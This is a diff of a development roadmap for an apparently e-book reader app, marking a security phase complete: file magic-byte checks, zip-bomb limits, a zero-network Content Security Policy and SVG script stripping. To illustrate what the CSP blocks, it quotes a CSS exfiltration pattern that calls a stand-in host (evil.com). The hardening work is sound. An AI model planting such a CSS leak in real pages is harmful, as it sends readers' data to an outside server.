@@ -38,9 +38,9 @@
 ├──────────────────────────────────────────────┤
 │  PHASE 8.6: 30-Day GC & Bi-Delete Sync   ✅  │
 ├──────────────────────────────────────────────┤
-│  PHASE 8.8: Storage Armor & Gatekeeper   ⏳  │ <── [ NEXT STAGE ]
+│  PHASE 8.8: Storage Armor & Gatekeeper   ✅  │
 ├──────────────────────────────────────────────┤
-│  PHASE 9: Mobile Release Train & Stores  ⏳  │
+│  PHASE 9: Mobile Release Train & Stores  ⏳  │ <── [ NEXT STAGE ]
 ├──────────────────────────────────────────────┤
 │  PHASE 10: TTS Audio & Accessibility     ⏳  │
 ├──────────────────────────────────────────────┤
@@ -217,29 +217,29 @@
 
 ---
 
-### Phase 8.8: Storage Armor, Ingestion Gatekeeper & Zero-Exfiltration Sandbox ⏳
-*Status: Planned*
+### Phase 8.8: Storage Armor, Ingestion Gatekeeper & Zero-Exfiltration Sandbox ✅
+*Status: Completed*
 
-- [ ] **Pre-Flight Ingestion Gatekeeper (`fileValidator.ts`)**:
+- [x] **Pre-Flight Ingestion Gatekeeper (`fileValidator.ts`)**:
   - **Magic Bytes Verification**:
     - PDF: Byte prefix check for `%PDF-` (`0x25 0x50 0x44 0x46`) and end-of-file trailer check for `%%EOF`.
     - EPUB: Local File Header check for `PK\x03\x04` (`0x50 0x4B 0x03 0x04`) and IDPF/W3C OCF uncompressed `mimetype` entry check for exact ASCII string `application/epub+zip`.
   - **Storage Abuse Firewall**: Rejects disguised Windows PE binaries (`.exe`), shell scripts, and corrupt archives at the door; immediately aborts local SQLite/IndexedDB insertion and completely cuts off Google Drive upload APIs to prevent Drive storage abuse or account flagging.
-- [ ] **Decompression Defense (Zip Bomb & DoS Shield)**:
+- [x] **Decompression Defense (Zip Bomb & DoS Shield)**:
   - **Central Directory Pre-Flight Scan**: Inspects ZIP Central Directory metadata records before any in-memory inflation / `pako` buffer allocation.
   - **Safety Ceiling Thresholds**:
     - `MAX_TOTAL_UNCOMPRESSED_SIZE`: Caps cumulative uncompressed size at 300 MB.
     - `MAX_DECOMPRESSION_RATIO`: Rejects archives exceeding 100:1 compression ratio (e.g. 1MB compressed -> 150MB uncompressed).
     - `MAX_ENTRY_COUNT`: Caps maximum inner files at 2,000 to prevent Directory Tree Exhaustion attacks.
-- [ ] **Zero-Exfiltration Sandbox & SVG Quarantine**:
+- [x] **Zero-Exfiltration Sandbox & SVG Quarantine**:
   - **Super CSP (Zero-Network Content Security Policy)**:
-    - Enforces `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src blob: data:; font-src blob: data:; connect-src 'none';">` inside reader viewer frames.
+    - Enforces `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline' blob:; worker-src blob:; style-src 'unsafe-inline'; img-src blob: data:; font-src blob: data:; connect-src 'none';">` inside reader viewer frames.
     - `connect-src 'none'` completely neutralizes all outbound network primitives (`fetch`, `XHR`, `WebSocket`).
     - `img-src blob: data:` and `font-src blob: data:` strictly prohibit external HTTP/HTTPS assets, completely eliminating CSS-based character exfiltration (`url('https://evil.com/leak?q=...')`).
   - **W3C SVG Security Isolation**:
     - Enforces rasterized/quarantined rendering via `<img>` tags (`<img src="blob:...">`), ensuring the browser runtime disables 100% of embedded `<script>` execution and DOM event handlers within SVG images.
-    - Strict prohibition of raw inline `<svg>` or `<object type="image/svg+xml">` injections.
-- [ ] **Automated Security Verification & Audit Suite**:
+    - Strict prohibition of raw inline `<svg>` or `<object type="image/svg+xml">` injections; actively strips `<script>` tags and `on*` event handlers from loaded SVGs.
+- [x] **Automated Security Verification & Audit Suite**:
   - Unit tests validating rejection of disguised binaries (`malware.exe` as `test.pdf`), Zip Bomb payloads, and malicious CSS trackers.
 
 ---
@@ -308,8 +308,10 @@
 | **D1 Sync & Quota Defense** | 7 | ✅ Done | ✅ Done | ✅ Done | ✅ Live |
 | **Google Drive & Info Lock (E2EE)** | 8 | ✅ Done | ✅ Done | ✅ Done | ✅ Done |
 | **Privacy, DMCA & Security Portal** | 8 | ✅ Done | ✅ Done | ✅ Done | N/A |
-| **Community Bookshelf & OPDS** | 8.5 | ⏳ Next | ⏳ Next | ⏳ Next | ⏳ Next |
-| **EAS Build & Store Release** | 9 | N/A | 📋 Planned | 📋 Planned | N/A |
+| **Community Bookshelf & OPDS** | 8.5 | ✅ Done | ✅ Done | ✅ Done | ✅ Done |
+| **30-Day GC & Bi-Delete Sync** | 8.6 | ✅ Done | ✅ Done | ✅ Done | ✅ Done |
+| **Storage Armor & Gatekeeper** | 8.8 | ✅ Done | ✅ Done | ✅ Done | N/A |
+| **EAS Build & Store Release** | 9 | N/A | ⏳ Next | ⏳ Next | N/A |
 | **EAS OTA Updates** | 9 | N/A | 📋 Planned | 📋 Planned | N/A |
 | **Text-to-Speech (TTS)** | 10 | 📋 Planned | 📋 Planned | 📋 Planned | N/A |
 | **Freemium & In-App Purchase** | 11 | 🔮 Future | 🔮 Future | 🔮 Future | 🔮 Future |
